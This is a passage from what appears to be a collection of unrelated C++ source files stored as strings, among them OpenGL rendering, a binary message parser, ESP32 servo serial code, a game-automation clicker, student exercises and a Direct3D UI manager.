-0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f, -0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f, -0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f, -0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f, -0.5f, -0.5f,  0.0f, 1.0f,\n\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n         0.5f,  0.5f, -0.5f,  1.0f, 1.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n         0.5f,  0.5f,  0.5f,  1.0f, 0.0f,\n        -0.5f,  0.5f,  0.5f,  0.0f, 0.0f,\n        -0.5f,  0.5f, -0.5f,  0.0f, 1.0f,\n    };\n    std::vector<unsigned int> indices = {\n        0, 1, 3,\n        1, 2, 3,\n    };\n\n    unsigned int vbo, vao, ebo;\n    glGenVertexArrays(1, &vao);\n    glGenBuffers(1, &vbo);\n    glGenBuffers(1, &ebo);\n\n    glBindVertexArray(vao);\n    glBindBuffer(GL_ARRAY_BUFFER, vbo);\n    glBufferData(GL_ARRAY_BUFFER, vertices.size() * sizeof(*vertices.data()), vertices.data(), GL_STATIC_DRAW);\n    glBindBuffer(GL_ELEMENT_ARRAY_BUFFER, ebo);\n    glBufferData(GL_ELEMENT_ARRAY_BUFFER, indices.size() * sizeof(*indices.data()), indices.data(), GL_STATIC_DRAW);\n\n    auto posLoc = shader.get_attribute_location(\"aPos\");\n    glVertexAttribPointer(posLoc, 3, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()), (void *) 0);\n    glEnableVertexAttribArray(posLoc);\n    auto texCoordLoc = shader.get_attribute_location(\"aTexCoord\");\n    glVertexAttribPointer(texCoordLoc, 2, GL_FLOAT, GL_FALSE, 5 * sizeof(*vertices.data()),\n                          (void *) (3 * sizeof(*vertices.data())));\n    glEnableVertexAttribArray(texCoordLoc);\n\n    unsigned int texture1;\n    glGenTextures(1, &texture1);\n    glBindTexture(GL_TEXTURE_2D, texture1);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image1(\"../assets/container.jpg\");\n    spdlog::info(\"image1: width = {}, height = {}, channel = {}\", image1.width(), image1.height(), image1.channel());\n    if (image1()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGB, image1.width(), image1.height(), 0, GL_RGB, GL_UNSIGNED_BYTE, image1);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image1.release();\n\n    unsigned int texture2;\n    glGenTextures(1, &texture2);\n    glBindTexture(GL_TEXTURE_2D, texture2);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_S, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_WRAP_T, GL_REPEAT);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MIN_FILTER, GL_LINEAR_MIPMAP_LINEAR);\n    glTexParameteri(GL_TEXTURE_2D, GL_TEXTURE_MAG_FILTER, GL_LINEAR);\n    lgl::StbImage image2(\"../assets/awesomeface.png\", true);\n    spdlog::info(\"image2: width = {}, height = {}, channel = {}\", image2.width(), image2.height(), image2.channel());\n    if (image2()) {\n        glTexImage2D(GL_TEXTURE_2D, 0, GL_RGBA, image2.width(), image2.height(), 0, GL_RGBA, GL_UNSIGNED_BYTE, image2);\n        glGenerateMipmap(GL_TEXTURE_2D);\n    } else {\n        spdlog::error(\"Failed to load texture\");\n    }\n    image2.release();\n\n    shader.use();\n    glUniform1i(shader.get_uniform_location(\"uTexture1\"), 0);\n    glUniform1i(shader.get_uniform_location(\"uTexture2\"), 1);\n\n    std::vector cubePositions {\n        glm::vec3( 0.1f,  0.0f,  0.0f),\n        glm::vec3( 2.0f,  5.0f, -15.0f),\n        glm::vec3(-1.5f, -2.2f, -2.5f),\n        glm::vec3(-3.8f, -2.0f, -12.3f),\n        glm::vec3( 2.4f, -0.4f, -3.",
    "\n// LogiParser.cpp : This file contains the 'main' function. Program execution begins and ends there.\n//\n\n#include <iostream>\n#include <fstream>\n#include <vector>\n#include <algorithm>\n\nusing namespace std;\n\ntypedef unsigned char Byte;\ntypedef int Int32;\n\n/// <summary>\n/// A structure which represents a message.\n/// </summary>\nstruct LogiMessage\n{\n    LogiMessage() : sequenceNumber(0), length(0), message(NULL) {}\n\n    Int32 sequenceNumber;\n    Int32 length;\n    char* message;\n};\n\n/// <summary>\n/// Checks the endianness of the system.\n/// </summary>\n/// <returns>true if the system is little-endian.</returns>\nbool isLittleEndian()\n{\n    const int value = 0x01;\n    const void* address = static_cast<const void*>(&value);\n    const unsigned char* leastSignificantAddress = static_cast<const unsigned char*>(address);\n    return *leastSignificantAddress == 0x01;\n}\n\n/// <summary>\n/// Helper function for endianness conversion.\n/// </summary>\n/// <typeparam name=\"T\">The type of the argument.</typeparam>\n/// <param name=\"pObj\">The pointer to the object.</param>\ntemplate <typename T>\nvoid endSwap(T* pObj)\n{\n    Byte* pMem = reinterpret_cast<Byte*>(pObj);\n    reverse(pMem, pMem + sizeof(T));\n}\n\nint main(int argc, char* argv[])\n{\n    // Check whether the file name is supplied.\n    if (argc < 2)\n    {\n        cout << \"Please specify a file name.\\n\";\n        return 1;\n    }\n\n    // Open the file.\n    ifstream stream(argv[1], ios::binary);\n\n    // Check whether the file is good.\n    if (!stream.good())\n    {\n        cout << \"Could not read the file.\\n\";\n        return 1;\n    }\n\n    // Read the file into LogiMessage items.\n    vector<LogiMessage> messages;\n    while (!stream.eof())\n    {\n        LogiMessage msg;\n\n        // Read the length.\n        stream.read((char*)&msg.length, sizeof(Int32));\n\n        // If there is no message, skip.\n        if (!msg.length)\n            continue;\n\n        // Read the sequence number.\n        stream.read((char*)&msg.sequenceNumber, sizeof(Int32));\n\n        // If the system is not little-endian, swap the bytes.\n        if (!isLittleEndian())\n        {\n            endSwap(&msg.sequenceNumber);\n            endSwap(&msg.length);\n        }\n\n        // Read the actual message content.\n        msg.message = (char*)malloc(msg.length + 1);\n        stream.read(msg.message, msg.length);\n        msg.message[msg.length] = '\\0';\n\n        messages.push_back(msg);\n    }\n\n    // Close the file resource.\n    stream.close();\n\n    // Output the messages, or they can be utilised in another way.\n    for (LogiMessage msg : messages)\n    {\n        printf(\"%d| %s\\n\", msg.sequenceNumber, msg.message);\n    }\n\n    return 0;\n}\n",
    "#include \"port_handler.h\"\n#include \"driver/uart.h\"\n#include \"driver/gpio.h\"\n#include \"esp_log.h\"\n#include \"arduino_droppings.h\"\n\nstatic const char * TAG = \"PORT HANDLER\";\n\nDXLPortHandler::DXLPortHandler()\n : open_state_(false)\n{}\n\n/* DXLPortHandler */\nbool DXLPortHandler::getOpenState()\n{\n  return open_state_;\n}\n\nvoid DXLPortHandler::setOpenState(bool state)\n{\n  open_state_ = state;\n}\n\n\nusing namespace DYNAMIXEL;\n\n/* SerialPortHandler */\nSerialPortHandler::SerialPortHandler(uart_port_t uart_num, gpio_num_t dir_pin)\n : DXLPortHandler(), uart_num_(uart_num), dir_pin_(dir_pin), baud_(1000000)\n{}\n\nvoid SerialPortHandler::begin()\n{\n  begin(baud_);\n}\n\nvoid SerialPortHandler::begin(unsigned long baud)\n{\n  baud_ = baud;\n  \n  uart_config_t uart_config;\n    \n  uart_config.baud_rate = int(baud);\n  uart_config.data_bits = UART_DATA_8_BITS;\n  uart_config.parity = UART_PARITY_DISABLE;\n  uart_config.stop_bits = UART_STOP_BITS_1;\n  uart_config.flow_ctrl = UART_HW_FLOWCTRL_DISABLE;\n  uart_config.rx_flow_ctrl_thresh = 122;\n  uart_config.source_clk = UART_SCLK_DEFAULT;\n\n    // Configure UART parameters\n    ESP_ERROR_CHECK(uart_param_config(uart_num_, &uart_config));\n\n    uart_set_mode(uart_num_, UART_MODE_UART);\n\n    // Set UART pins(TX: IO4, RX: IO5, RTS: IO18, CTS: IO19)\n    ESP_ERROR_CHECK(uart_set_pin(uart_num_, CONFIG_DXL_TX_PIN, CONFIG_DXL_RX_PIN, UART_PIN_NO_CHANGE , UART_PIN_NO_CHANGE ));\n\n    // Setup UART buffered IO\n    const int uart_buffer_size = (1024 * 2);\n    // Install UART driver (not using an event queue)\n    ESP_ERROR_CHECK(uart_driver_install(uart_num_, uart_buffer_size, uart_buffer_size, 10, NULL, 0));\n\n\n    // Since we're communicating half fuplex we also have to configure the direction pin\n    gpio_config_t io_conf;\n    \n    io_conf.intr_type = GPIO_INTR_DISABLE;\n    io_conf.mode = GPIO_MODE_INPUT_OUTPUT;\n    io_conf.pin_bit_mask = GPIO_OUTPUT_PIN_SEL;\n    io_conf.pull_down_en = GPIO_PULLDOWN_DISABLE;\n    io_conf.pull_up_en = GPIO_PULLUP_DISABLE;\n    \n    ESP_ERROR_CHECK(gpio_config(&io_conf));\n    ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n\n    setOpenState(true);\n}\n\nvoid SerialPortHandler::end(void)\n{\n  setOpenState(false);\n}\n\nint SerialPortHandler::available(void)\n{\n  int available = 0;\n  ESP_ERROR_CHECK(uart_get_buffered_data_len(uart_num_, (size_t*)&available));\n  return available;\n}\n\nint SerialPortHandler::read()\n{\n  int ret = 0;\n  uart_read_bytes(uart_num_, &ret, 1, portMAX_DELAY);\n  return ret;\n}\n\nsize_t SerialPortHandler::write(uint8_t c)\n{\n   size_t ret;\n\n  ESP_LOGI(TAG, \"Write single: %d\", c);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, HIGH));\n  while(gpio_get_level(dir_pin_) != HIGH)\n  {\n    // Wait for state change\n  }\n\n  ret = uart_write_bytes(uart_num_, &c, 1);\n  uart_wait_tx_done(uart_num_, 10 /* 1 RTOS ticks max wait time*/);\n\n  uart_flush(uart_num_);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n  while(gpio_get_level(dir_pin_) != LOW)\n  {\n    // Wait for state change\n  }\n\n  return ret;      \n}\n\nsize_t SerialPortHandler::write(uint8_t *buf, size_t len)\n{\n  size_t ret;\n\n  ESP_LOGI(TAG, \"Write buffer len: %d\", len);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, HIGH));\n  while(gpio_get_level(dir_pin_) != HIGH)\n  {\n    // Wait for state change\n  }\n\n  ret = uart_write_bytes(uart_num_, buf, len);\n  uart_wait_tx_done(uart_num_, 10 /* 1 RTOS ticks max wait time*/);\n\n  uart_flush(uart_num_);\n\n  ESP_ERROR_CHECK(gpio_set_level(dir_pin_, LOW));\n  while(gpio_get_level(dir_pin_) != LOW)\n  {\n    // Wait for state change\n  }\n\n  return ret;      \n}\n\nunsigned long SerialPortHandler::getBaud() const\n{\n  return baud_;\n}\n\n\n",
    "#include <fstream>\n#include <sstream>\n#include <vector>\n#include <iostream>\n#include <thread>\n\n#include \"string_processing.h\"\n#include \"utils.h\"\n#include \"farm_mode.h\"\n\nusing namespace std::literals;\n\nFarmMode::FarmMode(HWND h_window_handle) : h_window_handle_(h_window_handle){}\n\nFarmMode::FarmMode(std::string file_with_setting, HWND& h_window_handle) : search_drop_button_file_path_(file_with_setting),h_window_handle_(h_window_handle){}\n\nvoid FarmMode::ToggleResource(bool& resource){\n\n    if (resource == true) {\n        resource = false;\n    }\n    else {\n        resource = true;\n    }\n    resources = Resources::NONE;\n    Sleep(100);\n}\n\nvoid FarmMode::ApplyOrInitializeSettingsFromFile(){\n\n    if (h_window_handle_ == NULL) {\n        system(\"cls\");\n        MenuMessage();\n        std::cout << \"Process not found\"s << std::endl;\n        mode_selection.second = Command::NONE;\n        EnableDisableFunc(Command::NONE);\n        return;\n    }\n\n    std::ifstream input;\n    input.open(search_drop_button_file_path_);\n    if (!input.is_open()) {\n        std::cout << search_drop_button_file_path_ << \" file was not created or opened\"s << std::endl;\n        return;\n    }\n    std::string line;\n    std::size_t counter = 0;\n    while (std::getline(input, line)) {\n        if (counter == 27) {\n            std::pair<int, int> coord = ParseCoords(line);\n            drop_button_.x = coord.first;\n            drop_button_.y = coord.second;\n        }\n        if (counter == 28) {\n            std::pair<int, int> coord = ParseCoords(line);\n            search_button_.x = coord.first;\n            search_button_.y = coord.second;\n        }\n        ++counter;\n    }\n    input.close();\n}\n\nvoid FarmMode::ClickToSearchInventory() {\n    PostMessage(h_window_handle_, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(search_button_.x, search_button_.y));\n    PostMessage(h_window_handle_, WM_LBUTTONUP, 0, MAKELPARAM(search_button_.x, search_button_.y));\n}\n\nvoid FarmMode::ClickToDrop() {\n    PostMessage(h_window_handle_, WM_LBUTTONDOWN, MK_LBUTTON, MAKELPARAM(drop_button_.x, drop_button_.y));\n    PostMessage(h_window_handle_, WM_LBUTTONUP, 0, MAKELPARAM(drop_button_.x, drop_button_.y));\n}\n\nvoid FarmMode::Drop(std::string name) {\n\n    ClickToSearchInventory();\n    Sleep(100);\n    for (auto& a : name) {\n        PostMessage(h_window_handle_, WM_KEYDOWN, a, 0);\n        Sleep(20);\n    }\n    Sleep(400);\n    ClickToDrop();\n    Sleep(200);\n}\n\nvoid FarmMode::HandleInventory() {\n    Sleep(400);\n    std::cout << \"Press F\"s << std::endl;\n    PostMessage(h_window_handle_, WM_KEYDOWN, 'F', 0);\n    Sleep(1000);\n\n    if (b_stone_ == true) {\n        std::cout << \"DropStone()\"s << std::endl;\n        Drop(stone_);\n        Sleep(100);\n    }\n    if (b_flint_ == true) {\n        std::cout << \"DropFlint()\"s << std::endl;\n        Drop(flint_);\n        Sleep(100);\n    }\n    if (b_berry_ == true) {\n        std::cout << \"DropBerry()\"s << std::endl;\n        Drop(berry_);\n        Sleep(100);\n    }\n    if (b_thatch_ == true) {\n        std::cout << \"DropThatch()\"s << std::endl;\n        Drop(thatch_);\n        Sleep(100);\n    }\n    if (b_wood_ == true) {\n        std::cout << \"DropWood()\"s << std::endl;\n        Drop(wood_);\n        Sleep(100);\n    }\n    if (b_sand_ == true) {\n        std::cout << \"DropSand()\"s << std::endl;\n        Drop(sand_);\n    }\n    if (b_metal_ == true) {\n        std::cout << \"DropMetal()\"s << std::endl;\n        Drop(metal_);\n    }\n    PostMessage(h_window_handle_, WM_KEYDOWN, VK_ESCAPE, 0);\n}\n\nvoid FarmMode::FarmStart() {\n\n    ApplyOrInitializeSettingsFromFile();\n    mode_selection.second = Command::SELECT_SETTINGS;\n\n    int seconds = 100;\n    int seconds_2 = 0;\n\n    while (mode_selection.first == Command::FARM_MODE && mode_selection.second == Command::SELECT_SETTINGS) {\n        system(\"cls\");\n\n        std::cout << \"F1 - Start\\n\\n\"s;\n        std::cout << \"Seconds: \"s << seconds << std::endl;\n        std::cout << \"Throw away.\"s << std::endl;\n        std::cout << std::boolalpha << \"F2 - Flint \"s << b_flint_ << std::endl;\n        std::cout << std::boolalpha << \"F3 - Stone \"s << b_stone_ << std::endl;\n        std::cout << std::boolalpha << \"F4 - Wood \"s << b_wood_ << std::endl;\n        std::cout << std::boolalpha << \"F5 - Berry \"s << b_berry_ << std::endl;\n        std::cout << std::boolalpha << \"F6 - Thatch \"s << b_thatch_ << std::endl;\n        std::cout << std::boolalpha << \"F7 - Sand \"s << b_sand_ << std::endl;\n        std::cout << std::boolalpha << \"F8 - Metal \"s << b_metal_ << std::endl;\n        std::cout << \"F9 - Set clicking time before reset in seconds\"s << std::endl;\n\n        switch (resources)\n        {\n        case Resources::NONE:\n            break;\n        case Resources::DELAY:\n            system(\"cls\");\n            std::cout << \"Enter number of seconds: \"s;\n            std::cin >> seconds;\n            std::cout << \"OK == OK\"s << std::endl;\n            system(\"cls\");\n            resources = Resources::NONE;\n            Sleep(500);\n            break;\n        case R",
    "#include <iostream>\n#include <fstream>\n#include <vector>\n#include <string>\n\nvoid showTasks(const std::vector<std::string> &tasks){\n  std::cout << \"To-Do list: \" << std::endl;\n  for (int i = 0; i < tasks.size(); ++i) {\n    std::cout << i + 1 << \". \" << tasks[i] << std::endl; \n  }\n}\n\nint main (){\n  std::vector<std::string> tasks;\n  std::string task;\n  char choice;\n\n  // Load tasklist\n  std::ifstream inputFile(\"tasks.txt\");\n  while (getline(inputFile, task)){\n    tasks.push_back(task);\n  }\n  inputFile.close();\n\n  do{\n    std::cout << \"A - Add a task\" << std::endl;\n    std::cout << \"V - View tasks\" << std::endl;\n    std::cout << \"Q - Quit\" << std::endl;\n    std::cout << \"Enter your choise: \" << std::endl;\n    std::cin >> choice;\n\n    switch (choice) {\n        case 'A':\n        case 'a':\n          std::cout << \"Enter a task: \";\n          std::cin.ignore();\n          getline(std::cin, task);\n          tasks.push_back(task);\n          break;\n        case 'V':\n        case 'v':\n          showTasks(tasks);\n          break;\n    }\n  } while (choice != 'Q' && choice != 'q');\n\n  // Save tasks\n  std::ofstream outputFile(\"tasks.txt\");\n  for (const auto &t : tasks) {\n    outputFile << t << std::endl;\n  }\n  outputFile.close();\n\n  return 0;\n}\n",
    "#define _CRT_SECURE_NO_WARNINGS\n#include <iostream>\nusing namespace std;\n\nconst int MAXV = 20;\nstruct MaTranKe {\n\tint mtk[MAXV][MAXV];\n\tint n;\n};\n\n//Ham doc ma tran ke tu file van ban\nbool docMaTran(const char* file, MaTranKe& maTran) {\n\tFILE* filePointer = fopen(file, \"rt\");\n\tif (filePointer == NULL) return false;\n\tfscanf(filePointer, \"%d\", &maTran.n);\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tfscanf(filePointer, \"%d\", &maTran.mtk[i][j]);\n\t\t}\n\t}\n\tfclose(filePointer);\n\treturn true;\n}\n\n//Ham xuat ma tran ke\nvoid inMaTran(MaTranKe maTran) {\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tcout << endl;\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tcout << maTran.mtk[i][j] << \" \";\n\t\t}\n\t}\n}\n\n\n//Ham tra ve so canh cua do thi \nint demSoCanh(MaTranKe maTran) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++)\n\t{\n\t\tfor (int j = 0; j < maTran.n; j++)\n\t\t{\n\t\t\tif (maTran.mtk[i][j] != 0)\n\t\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tinh bac ra cua dinh u trong do thi\nint soBacRa(MaTranKe maTran, int u) {\n\tint count = 0;\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] != 0) {\n\t\t\tcount++;\n\t\t}\n\t}\n\treturn count;\n}\n\n//Ham tim canh co trong so V lon nhat cua dinh U\nint timCanhLonNhatCuaDinh(MaTranKe maTran, int u, int& v) {\n\tfor (int i = 0; i < maTran.n; i++) {\n\t\tif (maTran.mtk[u][i] > v) {\n\t\t\tv = maTran.mtk[u][i];\n\t\t}\n\t}\n\treturn v;\n}\n\nint main() {\n\tMaTranKe maTran;\n\tif (docMaTran(\"MaTranKe.txt\", maTran) == true) {\n\t\tcout << \"Ma tran co: \";\n\t\tinMaTran(maTran);\n\t\tcout << \"\\nSo canh cua do thi: \" << demSoCanh(maTran);\n\t}\n\telse \n\t\tcout << \"\\nKhong doc duoc ma tran.\" << endl;\n\n\tint u;\n\tcout << \"\\n\\nNhap bac muon kiem tra so bac ra: \"; cin >> u;\n\tcout << \"Bac cua \"<< u << \": \"  << soBacRa(maTran, u);\n\n\tint x, v = 0;\n\tcout << \"\\n\\nNhap bac muon tim canh co trong so lon nhat: \"; cin >> x;\n\tcout << \"Canh co trong so lon nhat cua \" << x << \" la: \" << timCanhLonNhatCuaDinh(maTran, x, v);\n\n\treturn 0;\n}",
    "#include <iostream>\nusing namespace std;\n//Mustafa Eldikan----- Student No: 1306210108-----16.05.2022 #Assignment (2)\n\nint main() {\n\tint const size = 10;\n\tint Array[size] = {0};\n\tint* Ptr = Array;\n\tint temp = 0;\n\t\n\tcout << \"Please enter ten numbers...\" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcin >> Array[i];\n\t}\n\n\n\tcout << \"Array's elements is : \" << endl;\n\n\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << Array[i] << \" , \";\n\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"Before sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\tcout << \"----------------------------\" << endl;\n\n\tcout << \"After sorting array ...: \" << endl;\n\tfor (int i = 0; i < size; i++)\n\t{\n\t\t\n\t\tfor (int j = i+1; j < size; j++)\n\t\t{\n\t\t\tif (*(Ptr + i) < *(Ptr + j))\n\t\t\t{\n\t\t\t\ttemp = *(Ptr+i);\n\t\t\t\t*(Ptr+i) = *(Ptr+j);\n\t\t\t\t*(Ptr + j) = temp;\n\n\t\t\t}\n\t\t\t\n\t\t}\n\t}\n\tfor (int i= 0; i < size; i++)\n\t{\n\t\tcout << *(Ptr + i) << \" , \";\n\t}\n\tcout << endl;\n\n\treturn 0;\n}",
    "// N3UIManager.cpp: implementation of the CN3UIManager class.\n//\n//////////////////////////////////////////////////////////////////////\n\n#include \"stdafx.h\"\n#include \"N3UIManager.h\"\n#include \"N3UITooltip.h\"\nCN3UIManager::__RenderStateForUI CN3UIManager::s_sRSFU; // RenderStateForUI\n\nCN3UIManager::CN3UIManager()\n{\n\n}\n\nCN3UIManager::~CN3UIManager()\n{\n}\n\nvoid CN3UIManager::Release()\n{\n\tCN3UIBase::Release();\n}\n\nDWORD CN3UIManager::MouseProc(DWORD dwFlags, const POINT& ptCur, const POINT& ptOld)\n{\n\tm_dwMouseFlagsCur = UI_MOUSEPROC_NONE;\n\tif (!m_bVisible) return m_dwMouseFlagsCur;\n\n\tif (s_pTooltipCtrl)\ts_pTooltipCtrl->MouseProc(dwFlags, ptCur, ptOld);\t// \ud234\ud301\uc5d0\uac8c \ub9c8\uc6b0\uc2a4 \uba54\uc138\uc9c0 \uc804\ub2ec.\n\n\t// child\uc5d0\uac8c \uba54\uc138\uc9c0 \uc804\ub2ec\n\tfor(UIListItor itor = m_Children.begin(); m_Children.end() != itor; )\n\t{\n\t\tCN3UIBase* pChild = (*itor);\n\t\tDWORD dwChildRet = pChild->MouseProc(dwFlags, ptCur, ptOld);\n\t\tif (UI_MOUSEPROC_DONESOMETHING & dwChildRet)\n\t\t{\t// \uc774\uacbd\uc6b0\uc5d0\ub294 \uba3c\uac00 \ud3ec\ucee4\uc2a4\ub97c \ubc1b\uc740 \uacbd\uc6b0\uc774\ub2e4.\n\t\t\titor = m_Children.erase(itor);\t\t\t// \uc6b0\uc120 \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \uc9c0\uc6b0\uace0\n\t\t\tm_Children.push_front(pChild);\t// \ub9e8\uc55e\uc5d0 \ub123\ub294\ub2e4. \uadf8\ub9ac\ub294 \uc21c\uc11c\ub97c \ub9e8 \ub098\uc911\uc5d0 \uadf8\ub9ac\ub3c4\ub85d \ud558\uace0 \uba54\uc138\uc9c0\ub97c \ub9e8 \uba3c\uc800 \ubc1b\uac8c \ud558\ub824\uace0\n\t\t\tm_dwMouseFlagsCur |= (UI_MOUSEPROC_DONESOMETHING|UI_MOUSEPROC_CHILDDONESOMETHING);\n\t\t\tReorderChildList();\t// child list \uc7ac\uc815\ub82c(\ud56d\uc0c1 \uc704\uc5d0 \ub728\ub294 dialog \ub54c\ubb38\uc5d0 \ub2e4\uc2dc \uc815\ub82c\ud55c\ub2e4.)\n\t\t\treturn m_dwMouseFlagsCur;\n\t\t}\n\t\telse if ( (\tUI_MOUSE_LBCLICK & dwFlags) && (UI_MOUSEPROC_INREGION & dwChildRet) )\n\t\t{\t// \uc601\uc5ed \uc548\uc744 \ud074\ub9ad \ud588\uc744\ub54c \uba3c\uac00 \uc77c\uc744 \ud588\ub2e4\uace0 \ud558\uace0 \ub9ac\ud134\ud574\ubc84\ub9b0\ub2e4.\n\t\t\titor = m_Children.erase(itor);\t\t\t// \uc6b0\uc120 \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \uc9c0\uc6b0\uace0\n\t\t\tm_Children.push_front(pChild);\t// \ub9e8\uc55e\uc5d0 \ub123\ub294\ub2e4. \uadf8\ub9ac\ub294 \uc21c\uc11c\ub97c \ub9e8 \ub098\uc911\uc5d0 \uadf8\ub9ac\ub3c4\ub85d \ud558\uace0 \uba54\uc138\uc9c0\ub97c \ub9e8 \uba3c\uc800 \ubc1b\uac8c \ud558\ub824\uace0\n\t\t\tm_dwMouseFlagsCur |= (UI_MOUSEPROC_DIALOGFOCUS);\n\t\t\tReorderChildList();\t// child list \uc7ac\uc815\ub82c(\ud56d\uc0c1 \uc704\uc5d0 \ub728\ub294 dialog \ub54c\ubb38\uc5d0 \ub2e4\uc2dc \uc815\ub82c\ud55c\ub2e4.)\n\t\t\treturn m_dwMouseFlagsCur;\n\t\t}\n\t\telse ++itor;\n\t\t//else if (UI_MOUSE_LBCLICKED|UI_MOUSE_MBCLICK|UI_MOUSE_MBCLICKED|UI_MOUSE_RBCLICK|UI_MOUSE_RBCLICKED)\n\n\t\tm_dwMouseFlagsCur |= dwChildRet;\n\t}\n\n\treturn m_dwMouseFlagsCur;\n}\n\nvoid CN3UIManager::ReorderChildList()\t// \ub2e4\uc774\uc54c\ub85c\uadf8 \uc21c\uc11c \uc7ac\ubc30\uce58\n{\n\tint iChildCount = m_Children.size();\n\tif (iChildCount<=0) return;\n\tCN3UIBase** ppBuffer = new CN3UIBase*[iChildCount];\n\tint iAlwaysTopChildCount = 0;\n\n\tfor(UIListItor itor = m_Children.begin(); m_Children.end() != itor; )\n\t{\n\t\tCN3UIBase* pChild = (*itor);\n\t\tif (pChild->GetStyle() & UISTYLE_ALWAYSTOP)\n\t\t{\n\t\t\titor = m_Children.erase(itor);\t\t\t// \uc6b0\uc120 \ub9ac\uc2a4\ud2b8\uc5d0\uc11c \uc9c0\uc6b0\uace0\n\t\t\tppBuffer[iAlwaysTopChildCount++] = pChild;\n\t\t}\n\t\telse ++itor;\n\t}\n\tint i;\n\tfor (i=iAlwaysTopChildCount-1; i>=0; --i)\n\t{\n\t\tm_Children.push_front(ppBuffer[i]);\t// \ub9e8\uc55e\uc5d0 \ub123\ub294\ub2e4. \uadf8\ub9ac\ub294 \uc21c\uc11c\ub97c \ub9e8 \ub098\uc911\uc5d0 \uadf8\ub9ac\ub3c4\ub85d \ud558\uace0 \uba54\uc138\uc9c0\ub97c \ub9e8 \uba3c\uc800 \ubc1b\uac8c \ud558\ub824\uace0\n\t}\n\tdelete [] ppBuffer;\n}\n\nvoid CN3UIManager::Tick()\n{\n\tCN3UIBase::Tick();\n\tif (s_pTooltipCtrl)\ts_pTooltipCtrl->Tick();\n}\n\nvoid CN3UIManager::Render()\n{\n\tthis->RenderStateSet();\n\n\tCN3UIBase::Render();\t// \uc790\uc2dd\ub4e4 render\n\tif (s_pTooltipCtrl) s_pTooltipCtrl->Render();\t// tooltip render\n\n\tthis->RenderStateRestore();\n}\n\nvoid CN3UIManager::RenderStateSet()\n{\n\tif(NULL == s_lpD3DDev) return;\n\n#ifdef _DEBUG\n\t__ASSERT(FALSE == s_sRSFU.bSet, \"\uc774\uc804\uc5d0 RenderStateSet()\ud568\uc218\ub97c \ud638\ucd9c\ud558\uace0 RenderStateRestore()\ud568\uc218\uac00 \ud638\ucd9c\ub418\uc9c0 \uc54a\uc740 \uc0c1\ud0dc\uc785\ub2c8\ub2e4.\");\n\ts_sRSFU.bSet = TRUE;\n#endif\n\n\t// back up old state\n\ts_lpD3DDev->GetRenderState(D3DRS_ZENABLE, &(s_sRSFU.dwZEnable));\n\ts_lpD3DDev->GetRenderState(D3DRS_ALPHABLENDENABLE, &(s_sRSFU.dwAlphaBlend));\n\ts_lpD3DDev->GetRenderState(D3DRS_SRCBLEND, &(s_sRSFU.dwSrcBlend));\n\ts_lpD3DDev->GetRenderState(D3DRS_DESTBLEND, &(s_sRSFU.dwDestBlend));\n\ts_lpD3DDev->GetRenderState(D3DRS_FOGENABLE, &(s_sRSFU.dwFog));\n\ts_lpD3DDev->GetTextureStageState(0, D3DTSS_MAGFILTER,   &(s_sRSFU.dwMagFilter));\n\ts_lpD3DDev->GetTextureStageState(0, D3DTSS_MINFILTER,   &(s_sRSFU.dwMinFilter));\n\ts_lpD3DDev->GetTextureStageState(0, D3DTSS_MIPFILTER,   &(s_sRSFU.dwMipFilter));\n\n\t// set state\n\tif (D3DZB_FALSE != s_sRSFU.dwZEnable) 